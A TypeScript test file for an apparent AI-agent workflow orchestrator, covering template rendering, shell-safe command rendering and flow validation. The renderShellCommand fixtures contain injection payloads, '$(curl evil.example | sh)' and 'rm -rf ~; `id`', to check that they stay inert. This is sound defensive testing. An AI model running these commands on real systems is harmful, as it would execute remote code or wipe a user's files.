import { describe, expect, test } from "bun:test";
import {
  type FlowDefinition,
  isActionStep,
  isAgentStep,
  renderShellCommand,
  renderTemplate,
  TemplateError,
  templateRefs,
  templateVariables,
  validateFlow,
} from "../src";

const ctx = {
  inputs: { issue: { url: "u", repo: "o/r", number: 7, title: "Fix it", body: "Body" }, note: "hello" },
  steps: { plan: { output: "the plan", structured: { files: ["a.ts"] } } },
};

describe("renderTemplate", () => {
  test("substitutes strings raw, numbers as text and objects as JSON", () => {
    expect(
      renderTemplate("{{inputs.issue.title}} #{{ inputs.issue.number }} {{inputs.note}} {{steps.plan.structured}}", ctx),
    ).toBe('Fix it #7 hello {"files":["a.ts"]}');
  });

  test("unknown path throws TemplateError naming the path", () => {
    expect(() => renderTemplate("{{steps.nope.output}}", ctx)).toThrow(TemplateError);
    expect(() => renderTemplate("x {{inputs.issue.labels}}", ctx)).toThrow("Unknown template variable: inputs.issue.labels");
  });

  test("does not resolve inherited properties", () => {
    expect(() => renderTemplate("{{inputs.constructor}}", ctx)).toThrow("Unknown template variable: inputs.constructor");
  });

  test("templateRefs lists every reference", () => {
    expect(templateRefs("a {{x.y}} b {{ z }}")).toEqual(["x.y", "z"]);
  });
});

describe("renderShellCommand", () => {
  const ctx = {
    inputs: { issue: { title: "$(curl evil.example | sh)", number: 7, note: "it's a 'test'" }, safe: "plain" },
    steps: { impl: { output: "rm -rf ~; `id`" } },
  };

  test("renders values as quoted env exports referenced by the script", () => {
    const script = renderShellCommand("make test N={{inputs.issue.number}} T={{inputs.safe}}", ctx);
    expect(script).toContain("export ORCH_REF_0='7'");
    expect(script).toContain("export ORCH_REF_1='plain'");
    expect(script.endsWith("\nmake test N=${ORCH_REF_0} T=${ORCH_REF_1}")).toBe(true);
  });

  test("keeps shell metacharacters in values inert, including quotes and newlines", () => {
    const script = renderShellCommand("echo {{inputs.issue.title}} {{steps.impl.output}} {{inputs.issue.note}}", ctx);
    const proc = Bun.spawnSync(["bash", "-c", script], { stdout: "pipe", stderr: "pipe" });
    expect(proc.exitCode).toBe(0);
    expect(proc.stdout.toString()).toBe("$(curl evil.example | sh) rm -rf ~; `id` it's a 'test'\n");
  });

  test("reuses one export for repeated references and errors on unknown paths", () => {
    const script = renderShellCommand("echo {{inputs.safe}} {{inputs.safe}}", ctx);
    expect(script.match(/export /g)).toHaveLength(1);
    expect(script).toBe("export ORCH_REF_0='plain'\necho ${ORCH_REF_0} ${ORCH_REF_0}");
    expect(() => renderShellCommand("echo {{inputs.missing}}", ctx)).toThrow(TemplateError);
  });
});

const baseFlow = {
  name: "f",
  inputs: [{ key: "issue", label: "Issue", type: "github_issue", required: true }],
  workspace: { kind: "local_path", path: "/repo", isolation: "worktree", baseRef: "HEAD", access: "rw" },
  harness: { id: "omp", model: "anthropic/claude-sonnet-4-5" },
};

describe("validateFlow", () => {
  test("accepts a full implementation flow and applies defaults", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "msg", name: "Msg", kind: "command", command: "commit-msg", args: "{{steps.impl.output}}" },
        { id: "commit", name: "Commit", kind: "git_commit", messageFrom: "msg" },
        { id: "push", name: "Push", kind: "git_push" },
        { id: "pr", name: "PR", kind: "github_pr", titleFrom: "msg", bodyFrom: "impl" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.sandbox.network.mode).toBe("gateway_only");
    expect(res.flow.approval).toBe("auto");
    expect(res.flow.steps[0]!.timeoutSec).toBe(1800);
  });

  test("accepts timeoutSec 0 as an infinite timeout and keeps it", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement it", timeoutSec: 0 },
        { id: "gate", name: "Gate", kind: "intervention", timeoutSec: 0 },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[0]!.timeoutSec).toBe(0);
    expect(res.flow.steps[1]!.timeoutSec).toBe(0);

    // Fractional and negative values stay invalid.
    expect(validateFlow({ ...baseFlow, steps: [{ id: "s", name: "S", kind: "git_push", timeoutSec: 1.5 }] }).ok).toBe(false);
    expect(validateFlow({ ...baseFlow, steps: [{ id: "s", name: "S", kind: "git_push", timeoutSec: -1 }] }).ok).toBe(false);
  });

  test("rejects forward step references in templates and *From fields", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "use {{steps.b.output}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "b" },
        { id: "b", name: "B", kind: "prompt", prompt: "hi" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.some((e) => e.includes("{{steps.b.output}}"))).toBe(true);
    expect(res.errors.some((e) => e.includes("messageFrom"))).toBe(true);
  });

  test("rejects action steps under direct isolation", () => {
    const res = validateFlow({
      ...baseFlow,
      workspace: { ...baseFlow.workspace, isolation: "direct" },
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.errors.join()).toContain('requires workspace isolation "worktree"');
  });

  test("rejects messageFrom pointing at an action step, undeclared inputs and bad issue subfields", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "{{inputs.missing}} {{inputs.issue.labels}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
        { id: "d", name: "D", kind: "git_commit", messageFrom: "c" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors).toHaveLength(3);
  });

  test("rejects github_pr without an earlier git_push and duplicate step ids", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "a", name: "A2", kind: "prompt", prompt: "hi" },
        { id: "pr", name: "PR", kind: "github_pr", titleFrom: "a", bodyFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.some((e) => e.includes("duplicate step id"))).toBe(true);
    expect(res.errors.some((e) => e.includes("git_push"))).toBe(true);
  });

  test("rejects invalid allowlist domains", () => {
    const res = validateFlow({
      ...baseFlow,
      sandbox: { network: { mode: "allowlist", allow: ["http://evil.com"] } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(res.ok).toBe(false);
  });

  test("accepts a slash step with args templates and rejects bad command names", () => {
    const ok = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "check", name: "Check", kind: "slash", command: "review", args: "focus on {{steps.impl.output}}" },
      ],
    });
    if (!ok.ok) throw new Error(ok.errors.join("\n"));
    expect(ok.flow.steps[1]!.kind).toBe("slash");

    const bad = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "s", name: "S", kind: "slash", command: "bad name" },
        { id: "t", name: "T", kind: "slash", command: "" },
        { id: "u", name: "U", kind: "slash", command: "with space" },
      ],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.filter((e) => e.includes("command")).length).toBe(3);
  });

  test("accepts a shell step whose command templates earlier steps and inputs", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "run", name: "Run", kind: "shell", command: "make test ARGS={{inputs.issue.number}} OUT={{steps.impl.output}}" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[1]).toMatchObject({ kind: "shell", timeoutSec: 1800 });
  });

  test("rejects shell steps with empty commands and forward step references", () => {
    const empty = validateFlow({
      ...baseFlow,
      steps: [{ id: "run", name: "Run", kind: "shell", command: "" }],
    });
    expect(empty.ok).toBe(false);
    if (!empty.ok) expect(empty.errors.join()).toContain("steps.0.command");

    const forward = validateFlow({
      ...baseFlow,
      steps: [
        { id: "use", name: "Use", kind: "shell", command: "echo {{steps.later.output}}" },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    expect(forward.ok).toBe(false);
    if (!forward.ok) {
      expect(forward.errors.some((e) => e.includes('steps.0 (use).command: {{steps.later.output}} references step "later" which is not an earlier step'))).toBe(true);
    }
  });

  test("accepts extra harness model roles and rejects default/smol and malformed role keys", () => {
    const ok = validateFlow({
      ...baseFlow,
      harness: { ...baseFlow.harness, modelRoles: { slow: "anthropic/claude-opus-4-5", plan: "litellm/glm-5.3" } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    if (!ok.ok) throw new Error(ok.errors.join("\n"));
    expect(ok.flow.harness.modelRoles).toEqual({ slow: "anthropic/claude-opus-4-5", plan: "litellm/glm-5.3" });

    const bad = validateFlow({
      ...baseFlow,
      harness: { ...baseFlow.harness, modelRoles: { default: "x/y", smol: "x/y", "bad key": "x/y" } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.some((e) => e.includes("modelRoles.default: set harness.model instead"))).toBe(true);
    expect(bad.errors.some((e) => e.includes("modelRoles.smol: set harness.smolModel instead"))).toBe(true);
    expect(bad.errors.some((e) => e.includes("modelRoles.bad key: role must match"))).toBe(true);
  });

  test("accepts an intervention step with an optional timeout and templated message", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "gate", name: "Review", kind: "intervention", message: "Check {{steps.impl.output}} before continuing" },
        { id: "after", name: "After", kind: "prompt", prompt: "{{steps.gate.output}}" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    const gate = res.flow.steps[1];
    expect(gate).toMatchObject({ kind: "intervention", message: "Check {{steps.impl.output}} before continuing" });
    expect(gate!.timeoutSec).toBeUndefined();

    const withTimeout = validateFlow({
      ...baseFlow,
      steps: [{ id: "gate", name: "Gate", kind: "intervention", message: "ok?", timeoutSec: 600 }],
    });
    if (!withTimeout.ok) throw new Error(withTimeout.errors.join("\n"));
    expect(withTimeout.flow.steps[0]!.timeoutSec).toBe(600);

    // message templates cannot reference later steps
    const fwd = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gate", name: "Gate", kind: "intervention", message: "{{steps.after.output}}" },
        { id: "after", name: "After", kind: "prompt", prompt: "x" },
      ],
    });
    expect(fwd.ok).toBe(false);
  });
});

describe("intervention steps", () => {
  test("is not an action step", () => {
    const step = { id: "gate", name: "Gate", kind: "intervention" };
    expect(isActionStep(step as never)).toBe(false);
    expect(isAgentStep(step as never)).toBe(false);
  });
});

const prFlow = {
  name: "pr-review",
  inputs: [{ key: "pr", label: "Pull request", type: "github_pull_request" }],
  workspace: { kind: "github_checkout" },
  harness: { id: "omp", model: "anthropic/claude-sonnet-4-5" },
  steps: [{ id: "review", name: "Review", kind: "prompt", prompt: "Review {{inputs.pr.title}} using {{inputs.pr.diffPath}}" }],
};

describe("validateFlow for flows with a pull request input", () => {
  test("accepts a manual review flow with a gate and a github_comment posting the final review", () => {
    const res = validateFlow({
      ...prFlow,
      inputs: [...prFlow.inputs, { key: "focus", label: "Focus", type: "text" }],
      steps: [
        ...prFlow.steps,
        { id: "gate", name: "Verify", kind: "intervention" },
        { id: "write", name: "Write", kind: "prompt", prompt: "Write the review for {{inputs.pr.url}}: {{steps.gate.output}} {{inputs.focus}}" },
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "write" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.trigger).toEqual({ kind: "manual" });
  });

  test("the github_pull_request trigger fills the PR input and applies defaults", () => {
    const res = validateFlow({ ...prFlow, trigger: { kind: "github_pull_request", repos: ["o/r"] } });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.trigger).toEqual({
      kind: "github_pull_request",
      repos: ["o/r"],
      events: ["opened", "synchronize", "reopened", "ready_for_review"],
      forkPolicy: "require_approval",
      postChecks: true,
    });
  });

  test("rejects local workspaces, action steps, ask approval, open network and unknown pr fields", () => {
    const res = validateFlow({
      ...prFlow,
      workspace: { kind: "local_path", path: "/repo" },
      approval: "ask",
      sandbox: { network: { mode: "open", allow: [] } },
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "{{inputs.pr.author}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ["github_checkout", 'approval "auto"', '"open"', 'github_pull_request input "pr" exposes only', "cannot contain git_commit"]) {
      expect(all).toContain(needle);
    }
  });

  test("rejects a second or optional PR input, and required extra inputs under the PR trigger", () => {
    const res = validateFlow({
      ...prFlow,
      trigger: { kind: "github_pull_request", repos: ["o/r"] },
      inputs: [
        ...prFlow.inputs,
        { key: "other", label: "Other", type: "github_pull_request", required: false },
        { key: "note", label: "Note", type: "text" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ["at most one github_pull_request input", "inputs.other: github_pull_request inputs must be required", "inputs.note: must be optional"]) {
      expect(all).toContain(needle);
    }
  });

  test("rejects shell steps in flows with a pull request input", () => {
    const res = validateFlow({
      ...prFlow,
      steps: [...prFlow.steps, { id: "run", name: "Run", kind: "shell", command: "cat {{inputs.pr.diffPath}}" }],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join()).toContain("flows with a pull request input cannot contain shell steps");
  });

  test("github_checkout and the PR trigger need the PR input", () => {
    const res = validateFlow({
      ...prFlow,
      inputs: [],
      trigger: { kind: "github_pull_request", repos: ["o/r"] },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ['"github_checkout" requires a github_pull_request input', "trigger requires a github_pull_request input"]) {
      expect(all).toContain(needle);
    }
  });
});

describe("github_comment steps", () => {
  test("comment on a required issue input of a local flow", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Fix {{inputs.issue.title}}" },
        { id: "note", name: "Note", kind: "github_comment", target: "issue", bodyFrom: "impl" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
  });

  test("target must be a required GitHub input", () => {
    const steps = (target: string) => [
      { id: "impl", name: "Implement", kind: "prompt", prompt: "x" },
      { id: "note", name: "Note", kind: "github_comment", target, bodyFrom: "impl" },
    ];
    const inputs = [
      { key: "issue", label: "Issue", type: "github_issue", required: false },
      { key: "text", label: "Text", type: "text" },
    ];
    for (const target of ["issue", "text", "missing"]) {
      const res = validateFlow({ ...baseFlow, inputs, steps: steps(target) });
      expect(res.ok).toBe(false);
      if (!res.ok) expect(res.errors.join()).toContain(`target: "${target}" must be a required github_issue or github_pull_request input`);
    }
  });

  test("bodyFrom must be an earlier text step", () => {
    const later = validateFlow({
      ...prFlow,
      steps: [{ id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review" }, ...prFlow.steps],
    });
    expect(later.ok).toBe(false);
    if (!later.ok) expect(later.errors.join()).toContain('bodyFrom: "review" must be an earlier');
    const chained = validateFlow({
      ...prFlow,
      steps: [
        ...prFlow.steps,
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review" },
        { id: "again", name: "Again", kind: "github_comment", target: "pr", bodyFrom: "post" },
      ],
    });
    expect(chained.ok).toBe(false);
    if (!chained.ok) expect(chained.errors.join()).toContain('bodyFrom: "post" must be an earlier');
  });

  test("bodyFrom accepts a shell step", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "probe", name: "Probe", kind: "shell", command: "make test" },
        { id: "post", name: "Post", kind: "github_comment", target: "issue", bodyFrom: "probe" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[1]).toMatchObject({ kind: "github_comment", bodyFrom: "probe" });
  });
});

describe("templateVariables", () => {
  const parse = (def: unknown): FlowDefinition => {
    const res = validateFlow(def);
    if (!res.ok) throw new Error(res.errors.join("\n"));
    return res.flow;
  };
  /** Replaces step `idx` with a prompt referencing every listed variable; the flow must still validate. */
  const expectAllValid = (def: FlowDefinition, idx: number) => {
    const prompt = templateVariables(def, idx).map((v) => `{{${v.path}}}`).join(" ");
    const steps = def.steps.map((s, i) => (i === idx ? { id: s.id, name: s.name, kind: "prompt", prompt } : s));
    parse({ ...def, steps });
  };

  test("lists inputs and earlier steps only, with structured just for agent steps", () => {
    const def = parse({
      ...baseFlow,
      inputs: [...baseFlow.inputs, { key: "note", label: "Note", type: "text", required: false }],
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "go" },
        { id: "commit", name: "Commit", kind: "git_commit", messageFrom: "impl" },
        { id: "review", name: "Review", kind: "prompt", prompt: "check" },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    const paths = templateVariables(def, 2).map((v) => v.path);
    expect(paths).toEqual([
      "inputs.issue",
      "inputs.issue.url",
      "inputs.issue.repo",
      "inputs.issue.number",
      "inputs.issue.title",
      "inputs.issue.body",
      "inputs.note",
      "steps.impl.output",
      "steps.impl.structured",
      "steps.commit.output",
    ]);
    expect(templateVariables(def, 0).some((v) => v.path.startsWith("steps."))).toBe(false);
    for (let i = 0; i < def.steps.length; i++) expectAllValid(def, i);
  });

  test("pull request inputs expose their fields", () => {
    const def = parse({
      ...prFlow,
      steps: [...prFlow.steps, { id: "summary", name: "Summary", kind: "prompt", prompt: "sum up" }],
    });
    const paths = templateVariables(def, 1).map((v) => v.path);
    expect(paths).toContain("inputs.pr");
    expect(paths).toContain("inputs.pr.url");
    expect(paths).toContain("inputs.pr.diffPath");
    expect(paths).toContain("steps.review.structured");
    expectAllValid(def, 1);
  });
});
